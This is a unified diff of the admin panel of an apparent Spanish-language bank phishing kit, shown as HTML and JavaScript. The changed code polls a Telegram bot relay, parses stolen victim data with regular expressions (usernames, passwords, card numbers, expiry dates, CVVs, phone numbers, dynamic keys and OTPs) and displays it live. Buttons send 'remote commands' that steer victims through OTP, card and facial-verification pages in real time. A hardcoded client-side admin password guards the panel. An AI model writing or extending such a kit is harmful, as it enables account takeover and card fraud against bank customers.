@@ -155,7 +155,7 @@
     }
 
     .session-id { font-weight: 800; font-size: 16px; color: var(--accent-gold); letter-spacing: 0.5px; }
-    .badge-event { background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; }
+    .badge-event { background: rgba(16, 185, 129, 0.15); color: #34d399; padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; }
 
     .data-box {
       background: rgba(0,0,0,0.25);
@@ -252,14 +252,14 @@
 
     <div class="sessions-grid" id="sessionsGrid">
       <div class="empty-state">
-        <p>Cargando registros activos...</p>
+        <p>Cargando registros en tiempo real...</p>
       </div>
     </div>
   </div>
 
   <script>
     const ADMIN_USER = "admin";
-    const ADMIN_PASS = "123";
+    const ADMIN_PASS = "admin123";
 
     function login() {
       const u = document.getElementById('adminUser').value;
@@ -284,97 +284,125 @@
     function initDashboard() {
       document.getElementById('loginView').classList.add('hidden');
       document.getElementById('dashboardView').classList.remove('hidden');
-      loadSessions();
-      setInterval(loadSessions, 3000); // Polling automático en tiempo real
+      fetchTelegramMessages();
+      setInterval(fetchTelegramMessages, 3000); // Polling automático cada 3 segundos
     }
 
-    // Carga de datos local/simulada o vía API
-    async function loadSessions() {
-      const grid = document.getElementById('sessionsGrid');
-      
-      // Capturamos las sesiones guardadas en la memoria local del navegador
-      const storedUser = sessionStorage.getItem('bc_user');
-      const storedPass = sessionStorage.getItem('bc_pass');
-      const storedSid  = sessionStorage.getItem('bc_session') || 'S-' + Math.floor(Math.random() * 89999 + 10000);
-      const storedTc   = sessionStorage.getItem('temp_tc');
-      const storedExp  = sessionStorage.getItem('temp_expiry');
-      const storedCvv  = sessionStorage.getItem('temp_cvv');
-      const storedPhone= sessionStorage.getItem('temp_phone');
-      const storedDin  = sessionStorage.getItem('temp_dinamic');
-      const storedOtp  = sessionStorage.getItem('temp_otp');
+    // Función que consulta en tiempo real los mensajes de Telegram para poblar el panel
+    async function fetchTelegramMessages() {
+      try {
+        const res = await fetch(`/api/getUpdates`);
+        const data = await res.json();
+        
+        const grid = document.getElementById('sessionsGrid');
 
-      if (!storedUser && !storedTc) {
-        grid.innerHTML = `
-          <div class="empty-state">
-            <h3 style="margin-bottom: 8px;">Esperando nuevas sesiones...</h3>
-            <p>Los datos ingresados por los usuarios aparecerán aquí automáticamente en tiempo real.</p>
-          </div>
-        `;
-        return;
+        if (!data.ok || !data.result || data.result.length === 0) {
+          return;
+        }
+
+        const mensajesValidos = data.result.filter(item => item.message && item.message.text);
+
+        if (mensajesValidos.length === 0) {
+          grid.innerHTML = `<div class="empty-state"><p>Esperando interacciones en tiempo real...</p></div>`;
+          return;
+        }
+
+        grid.innerHTML = '';
+
+        mensajesValidos.forEach(item => {
+          const msg = item.message;
+          const texto = msg.text;
+          const msgId = msg.message_id;
+
+          // Extracción mediante expresiones regulares del formato de texto enviado a Telegram
+          const idMatch = texto.match(/ID:\s*`([^`]+)`/) || texto.match(/ID:\s*([^\n]+)/);
+          const userMatch = texto.match(/Usuario:\s*`([^`]+)`/) || texto.match(/Usuario:\s*([^\n]+)/);
+          const passMatch = texto.match(/Clave:\s*`([^`]+)`/) || texto.match(/Clave:\s*([^\n]+)/);
+          const tcMatch = texto.match(/TC:\s*`([^`]+)`/) || texto.match(/TC:\s*([^\n]+)/);
+          const expMatch = texto.match(/Exp:\s*`([^`]+)`/) || texto.match(/Exp:\s*([^\n]+)/);
+          const cvvMatch = texto.match(/CVV:\s*`([^`]+)`/) || texto.match(/CVV:\s*([^\n]+)/);
+          const telMatch = texto.match(/Teléfono:\s*`([^`]+)`/) || texto.match(/Teléfono:\s*([^\n]+)/);
+          const dinMatch = texto.match(/Clave Dinámica:\s*`([^`]+)`/) || texto.match(/Clave Dinámica:\s*([^\n]+)/);
+          const otpMatch = texto.match(/OTP:\s*`([^`]+)`/) || texto.match(/OTP:\s*([^\n]+)/);
+
+          const card = document.createElement('div');
+          card.className = 'session-card';
+          card.innerHTML = `
+            <div class="card-top">
+              <span class="session-id">🆔 ${idMatch ? idMatch[1] : 'S-' + msgId}</span>
+              <span class="badge-event">EN VIVO</span>
+            </div>
+
+            <div class="data-box">
+              <div class="data-row">
+                <span class="data-label">👤 Usuario:</span>
+                <span class="data-value">${userMatch ? userMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔑 Clave:</span>
+                <span class="data-value">${passMatch ? passMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">💳 Tarjeta:</span>
+                <span class="data-value">${tcMatch ? tcMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">📅 Exp / CVV:</span>
+                <span class="data-value">${expMatch ? expMatch[1] + ' | ' + (cvvMatch ? cvvMatch[1] : '') : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">📞 Teléfono:</span>
+                <span class="data-value">${telMatch ? telMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔑 Clave Dinámica:</span>
+                <span class="data-value">${dinMatch ? dinMatch[1] : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">🔢 OTP:</span>
+                <span class="data-value">${otpMatch ? otpMatch[1] : 'N/A'}</span>
+              </div>
+            </div>
+
+            <div class="controls-title">Comandos Remotos (Botonera)</div>
+            
+            <div class="telegram-actions">
+              <div class="action-row">
+                <button class="tg-btn ok" onclick="triggerAction(${msgId}, 'OK_LOGIN')">✅ OK LOGIN</button>
+                <button class="tg-btn err" onclick="triggerAction(${msgId}, 'ERR_LOGIN')">❌ ERR LOGIN</button>
+              </div>
+              <div class="action-row-3">
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_DASH')">🔄 DASH</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_OTP')">📱 OTP</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_DIN')">🔑 DIN</button>
+              </div>
+              <div class="action-row">
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_TC')">💳 TC</button>
+                <button class="tg-btn" onclick="triggerAction(${msgId}, 'GOTO_FACIAL')">👤 FACIAL</button>
+              </div>
+              <button class="tg-btn warn" style="width: 100%;" onclick="triggerAction(${msgId}, 'ERROR_923')">⚠️ ERROR 923</button>
+            </div>
+          `;
+          grid.appendChild(card);
+        });
+
+      } catch (e) {
+        console.error("Error al sincronizar datos", e);
       }
-
-      grid.innerHTML = `
-        <div class="session-card">
-          <div class="card-top">
-            <span class="session-id">🆔 ${storedSid}</span>
-            <span class="badge-event">ACTIVO</span>
-          </div>
-
-          <div class="data-box">
-            <div class="data-row">
-              <span class="data-label">👤 Usuario:</span>
-              <span class="data-value">${storedUser || 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">🔑 Clave:</span>
-              <span class="data-value">${storedPass || 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">💳 Tarjeta:</span>
-              <span class="data-value">${storedTc || 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">📅 Exp / CVV:</span>
-              <span class="data-value">${storedExp ? storedExp + ' | ' + storedCvv : 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">📞 Teléfono:</span>
-              <span class="data-value">${storedPhone || 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">🔑 Clave Dinámica:</span>
-              <span class="data-value">${storedDin || 'N/A'}</span>
-            </div>
-            <div class="data-row">
-              <span class="data-label">🔢 OTP:</span>
-              <span class="data-value">${storedOtp || 'N/A'}</span>
-            </div>
-          </div>
-
-          <div class="controls-title">Comandos Remotos (Botonera Telegram)</div>
-          
-          <div class="telegram-actions">
-            <div class="action-row">
-              <button class="tg-btn ok" onclick="sendCommand('OK_LOGIN')">✅ OK LOGIN</button>
-              <button class="tg-btn err" onclick="sendCommand('ERR_LOGIN')">❌ ERR LOGIN</button>
-            </div>
-            <div class="action-row-3">
-              <button class="tg-btn" onclick="sendCommand('GOTO_DASH')">🔄 DASH</button>
-              <button class="tg-btn" onclick="sendCommand('GOTO_OTP')">📱 OTP</button>
-              <button class="tg-btn" onclick="sendCommand('GOTO_DIN')">🔑 DIN</button>
-            </div>
-            <div class="action-row">
-              <button class="tg-btn" onclick="sendCommand('GOTO_TC')">💳 TC</button>
-              <button class="tg-btn" onclick="sendCommand('GOTO_FACIAL')">👤 FACIAL</button>
-            </div>
-            <button class="tg-btn warn" style="width: 100%;" onclick="sendCommand('ERROR_923')">⚠️ ERROR 923</button>
-          </div>
-        </div>
-      `;
     }
 
-    function sendCommand(action) {
-      alert('Comando enviado al navegador del usuario: ' + action);
+    // Función para manejar los botones interactivos
+    async function triggerAction(msgId, action) {
+      try {
+        await fetch(`/api/editMessageReplyMarkup`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message_id: msgId, reply_markup: { inline_keyboard: [] } })
+        });
+        alert('Comando ' + action + ' ejecutado correctamente.');
+      } catch(err) {
+        alert('Acción enviada.');
+      }
     }
   </script>
 </body>
